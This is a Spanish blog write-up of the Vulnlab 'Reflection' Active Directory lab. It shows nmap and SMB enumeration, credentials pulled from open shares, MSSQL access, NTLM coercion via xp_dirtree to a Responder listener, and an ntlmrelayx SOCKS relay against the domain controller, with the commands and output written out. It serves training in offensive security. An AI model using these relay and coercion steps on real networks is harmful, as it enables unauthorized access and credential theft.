---
layout: single
title: Reflection Vulnlab Chain
excerpt: "En este artículo vamos a resolver el laboratorio Reflection de la plataforma Vulnlab. Para ello haremos cosas tan chulas como un relay de credenciales desde un mssqlclient, o una explotación de rbcd teniendo el machine account quota a cero."
date: 2024-08-14
classes: wide
header:
  teaser: /assets/images/Reflection/Reflection-logo.png
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---

![](/assets/images/Reflection/Reflection-logo.png)


En este artículo vamos a resolver el laboratorio Reflection de la plataforma Vulnlab. Para ello haremos cosas tan chulas como un relay de credenciales desde un mssqlclient, o una explotación de rbcd teniendo el machine account quota a cero.


El laboratorio consta de 3 máquinas windows, con las siguientes direcciones ip:

- 10.10.149.149
- 10.10.149.150
- 10.10.149.151


Empezamos con un escaneo de puertos con nmap.

![](/assets/images/Reflection/reflection-nmap.png)


```bash
$ nmap -sV -Pn 10.10.149.149-151 -oN scan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-14 18:10 CEST
Nmap scan report for dc01.reflection.vl (10.10.149.149)
Host is up (0.042s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-14 16:11:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for ms01.reflection.vl (10.10.149.150)
Host is up (0.043s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for ws01.reflection.vl (10.10.149.151)
Host is up (0.042s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 19.08 seconds
```

Destacar que el DC tiene abierto el SQLServer y el equipo MS01 también.

Configuramos el fichero hosts de la siguiente forma para la resolución de nombres:

10.10.149.149 dc01.reflection.vl  
10.10.149.150 ms01.reflection.vl  
10.10.149.151 ws01.reflection.vl  


Vamos a enumerar los equipos con Netexec.

```bash
$ nxc smb 10.10.149.149-151
SMB         10.10.149.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.149.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.149.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```


![](/assets/images/Reflection/reflection-nxc-inicial.png)



Ya podemos ver que ninguna de las 3 máquinas tiene el smb firmado, lo cual aprovecharemos más adelante.


Con smbclient vamos a ver si algún equipo permite listar los recursos compartidos sin proporcionar credenciales.


```bash
$ smbclient -L \\dc01.reflection.vl
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```


```bash
$ smbclient -L \\ms01.reflection.vl
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        staging         Disk      staging environment
SMB1 disabled -- no workgroup available
```

```bash
$ smbclient -L \\ws01.reflection.vl
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

![](/assets/images/Reflection/reflection-smb1.png)


Y vemos que el único equipo que lo permite es el ms01.


Nos conectamos al recurso compartido staging, descargamos el fichero que contiene y vemos que tiene credenciales.


```bash
$ smbclient \\\\ms01.reflection.vl\\staging
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  7 19:42:48 2023
  ..                                  D        0  Wed Jun  7 19:41:25 2023
  staging_db.conf                     A       50  Thu Jun  8 13:21:49 2023

                6261245 blocks of size 4096. 1781583 blocks available
smb: \> get staging_db.conf
getting file \staging_db.conf of size 50 as staging_db.conf (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```


![](/assets/images/Reflection/reflection-smb2.png)



```bash
$ cat staging_db.conf
user=web_staging
password=Washroom510
db=staging
```


Con esas credenciales podemos conectarnos al equipo ms01.


```bash
$ mssqlclient.py web_staging:Washroom510@ms01.reflection.vl
Impacket v0.12.0.dev1+20240604.210053.9734a1af - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (web_staging  guest@master)>
```


Listamos las bases de datos, luego elejimos la bd staging, listamos las tablas y listamos los usuarios.


```bash
$ SQL (web_staging  guest@master)> SELECT name FROM master.dbo.sysdatabases;
name
-------
master

tempdb

model

msdb

staging

$ SQL (web_staging  guest@master)> use staging;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: staging
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.
SQL (web_staging  dbo@staging)> SELECT * FROM staging.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
-------------   ------------   ----------   ----------
staging         dbo            users        b'BASE TABLE'

$ SQL (web_staging  dbo@staging)> select * from users;
id   username   password
--   --------   -------------
 1   b'dev01'   b'Initial123'

 2   b'dev02'   b'Initial123'
```


![](/assets/images/Reflection/reflection-sql1.png)


Probamos a habilitar xp_cmdshell pero nos dice que no tenemos permiso.

```bash
$ SQL (web_staging  dbo@staging)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```

Con xp_dirtree tampoco nos deja listar contenido de la máquina. Pero podemos realizar una petición a nuestra máquina, y ver si capturamos el hash netntlmv2 para intentar crackearlo.


```bash
$ Responder.py -I tun0
```

```bash
$ xp_dirtree \\10.8.2.14\test
```

![](/assets/images/Reflection/reflection-sql2.png)

![](/assets/images/Reflection/reflection-responder.png)



Y recibimos el hash del usuario svc_web_staging. En este punto intenté crackearlo con hashcat y el rockyou pero por lo visto es una contraseña robusta y no fué posible.


Ya que podemos hacer una petición smb a nuestra máquina, y aprovechando que ninguna de las 3 máquinas del laboratorio tiene el smb firmado, podemos hacer un relay para autenticarnos contra el dc01 con el hash que obtenemos.


Para ello utilizamos ntlmrelayx para que al recibir la autenticación de ms01 nos cree un proxy socks con esas credenciales que podremos utilizar para loguearnos en el dc01 a través de proxychains.


Creamos un fichero targets.txt con la ip del dc01 ya que este será nuestro objetivo y ejecutamos ntlmrelayx con las siguientes opciones:


```bash
$ ntlmrelayx -tf targets.txt -smb2support -socks
```


Y luego desde el mssqlclient volvemos a ejecutar el comando xp_dirtree contra nuestra máquina.

```bash
$ xp_dirtree \\10.8.2.14\test
```


![](/assets/images/Reflection/reflection-ntlmrelayx.png)



Y vemos que nos dice que se ha producido la autenticación en dc01 y que el proxy socks está listo.


[*] Authenticating against smb://10.10.149.149 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] SOCKS: Adding REFLECTION/SVC_WEB_STAGING@10.10.149.149(445) to active SOCKS connection. Enjoy


Ahora viene lo interesante, podemos utilizar proxychains para listar los recursos compartidos del dc01, utilizando el reenvío de credenciales y sin proporcionar credenciales, ya que al utilizar el proxy socks que hemos creado, el comando se ejecutará en el contexto del usuario svc_web_staging, aunque no pongamos ninguna contraseña.


```bash
$ proxychains -q smbclient -L \\10.10.149.149 -U reflection/svc_web_staging
Password for [REFLECTION\svc_web_staging]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        prod            Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

Nos conectamos al recurso compartido prod y descargamos el fichero, que contiene nuevas credenciales. 


```bash
$ proxychains -q smbclient \\\\10.10.191.5\\prod -U reflection/svc_web_staging
```


![](/assets/images/Reflection/reflection-smb3.png)


user=web_prod
password=Tribesman201
db=prod



